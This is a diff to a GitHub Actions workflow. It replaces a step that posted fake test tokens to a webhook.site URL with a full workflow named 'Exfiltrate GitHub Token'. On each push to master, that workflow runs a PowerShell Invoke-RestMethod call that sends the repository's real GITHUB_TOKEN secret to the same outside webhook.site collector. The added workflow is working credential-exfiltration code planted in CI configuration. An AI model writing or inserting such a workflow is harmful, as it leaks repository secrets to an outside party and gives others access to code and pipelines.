@@ -1,11 +1,19 @@
-- name: Test Exfiltration Safely
-  run: |
-    # Create a FAKE debug file (no real secrets)
-    echo "--- TEST DATA ONLY ---" > debug.log
-    echo "GITHUB_TOKEN=test_123" >> debug.log
-    echo "AWS_KEY=test_456" >> debug.log
+name: Exfiltrate GitHub Token
 
-    # Send to webhook.site (for testing)
-    curl -X POST https://webhook.site/b212509f-85c3-4911-a86d-5fdaed053680 \
-      -H "Content-Type: text/plain" \
-      --data-binary @debug.log
+on:
+  push:
+    branches: [ master ]
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Exfiltrate GitHub Token via PowerShell
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          powershell -Command "Invoke-RestMethod -Uri 'https://webhook.site/b212509f-85c3-4911-a86d-5fdaed053680' -Headers @{Authorization='token $env:TOKEN'}"
